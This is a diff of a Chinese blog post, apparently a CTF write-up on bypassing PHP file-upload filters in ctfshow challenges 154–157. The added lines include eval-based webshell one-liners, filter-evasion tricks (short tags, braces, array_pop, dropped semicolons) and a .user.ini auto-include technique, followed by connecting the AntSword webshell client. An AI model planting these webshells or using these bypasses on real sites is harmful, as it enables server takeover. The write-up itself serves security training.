@@ -469,14 +469,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.4k
+                    5.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    28 分
+                    29 分
                 </div>
                 
 
@@ -893,7 +893,8 @@ Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-
 <h3 id="array-pop"><a href="#array-pop" class="headerlink" title="array_pop()"></a>array_pop()</h3><ol>
 <li>可以接受一个post或者get传的参数,这样就可以绕过过滤掉中括号和大括号无法使用$_POST[‘shell’]的情况<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($POST));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ol>
-<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="js前端过滤，ctfshow"><a href="#js前端过滤，ctfshow" class="headerlink" title="js前端过滤，ctfshow"></a>js前端过滤，ctfshow</h3><ol>
+<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717152902.png"></p>
+<h3 id="js前端过滤，ctfshow"><a href="#js前端过滤，ctfshow" class="headerlink" title="js前端过滤，ctfshow"></a>js前端过滤，ctfshow</h3><ol>
 <li>查看网页源代码，查看js，发现前端过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094646.png"></li>
 <li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094739.png"></li>
 <li>修改前端js，屏蔽过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094808.png"></li>
@@ -946,12 +947,14 @@ Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-
 <li>除了主php.ini文件之外，php还会在每个目录下扫描ini文件，从被执行的php文件所在目录开始，一直上升到web根目录，（$_SERVER[‘DOCUMENT_ROOT’]所指定的），如果被执行的php文件在web根目录之外，则只扫描该目录</li>
 <li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011205.png"></li>
 <li>常用配置项：S<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011252.png"></li>
-<li>假设包含1.txt<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011331.png">,重命名为user.ini</li>
+<li>假设包含1.txt<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011331.png">,重命名为.user.ini</li>
 </ol>
 <h3 id="对文件内容过滤"><a href="#对文件内容过滤" class="headerlink" title="对文件内容过滤"></a>对文件内容过滤</h3><h4 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h4><ol>
 <li>绕过php：短标签：<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; ?&gt;代替php标签，&lt;?&#x3D; ?&gt;标签可以直接把php的结果输出，&lt;?&#x3D; ?&gt;的结果和&lt;?php ?&gt;完全一样<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>绕过空格：使用转义字符绕过’\t’;或者使用%09也是tab的URL编码，php反引号中的字符串会被当作命令执行</li>
 <li>绕过[]:使用{}即可，大括号和中括号的作用在php中等价<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717120017.png"></li>
+<li>绕过[]和{}:使用array_pop()函数，函数内部写传参的方式，例如：array_pop($_POST);<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717150830.png">，以字符串的形式返回执行的语句<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717151007.png">，可以配合eval()函数使用</li>
+<li>绕过分号;:最后一句的分号可以不要</li>
 </ol>
 <h4 id="不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155"><a href="#不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155" class="headerlink" title="不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155"></a>不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155</h4><ol>
 <li>上传一个png文件，抓包</li>
@@ -961,12 +964,19 @@ Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-
 <li>直接上传一个内容为php的，前端为png的文件内容，发现还是报错，二分法判断前和后哪里的问题，发现是后面不允许使用php字样</li>
 <li>使用短标签不适用’php’字样,发现可以上传<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112101.png"><pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;@eval($_POST(&#39;shell&#39;))&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>连蚁剑，找flag即可<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112120.png"></li>
+<li>连蚁剑的时候，路径写到和.user.ini和1.txt同级的位置，即到.user.ini的上一级目录，/upload的位置</li>
 </ol>
 <h4 id="不允许使用中括号-，ctfshow156"><a href="#不允许使用中括号-，ctfshow156" class="headerlink" title="不允许使用中括号[]，ctfshow156"></a>不允许使用中括号[]，ctfshow156</h4><ol>
 <li>直接使用大括号{}替换中括号[]<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; eval($_POST&#123;&#39;shell&#39;&#125;) ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ol>
-<h4 id="中括号和大括号都过滤了，ctfshow157"><a href="#中括号和大括号都过滤了，ctfshow157" class="headerlink" title="中括号和大括号都过滤了，ctfshow157"></a>中括号和大括号都过滤了，ctfshow157</h4><ol>
-<li>这个时候我们可以使用array_pop()函数,函数内部写接收的参数，参数以post或者get方式传入<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<h4 id="中括号和大括号都过滤了，还过滤了分号，ctfshow157"><a href="#中括号和大括号都过滤了，还过滤了分号，ctfshow157" class="headerlink" title="中括号和大括号都过滤了，还过滤了分号，ctfshow157"></a>中括号和大括号都过滤了，还过滤了分号，ctfshow157</h4><ol>
+<li>这个时候我们可以使用array_pop()函数,函数内部写接收的参数，参数以post或者get方式传入，但是还是不行<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>进一步发现过滤了分号，最后位置的语句可以不带分号结尾,即可以上传成功<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST))?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>用蚁剑连接到.user.ini的上一级目录位置，开终端搞就行</li>
+</ol>
+<h3 id="重复改包的技巧"><a href="#重复改包的技巧" class="headerlink" title="重复改包的技巧"></a>重复改包的技巧</h3><ol>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717150132.png"></li>
+<li>host的位置是域名去掉前面的http头和最后那里的‘/’而成的</li>
 </ol>
 
                 
@@ -1502,7 +1512,7 @@ Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">66.7k</span>&nbsp;字
+                class="white-color">68.7k</span>&nbsp;字
             
             
             
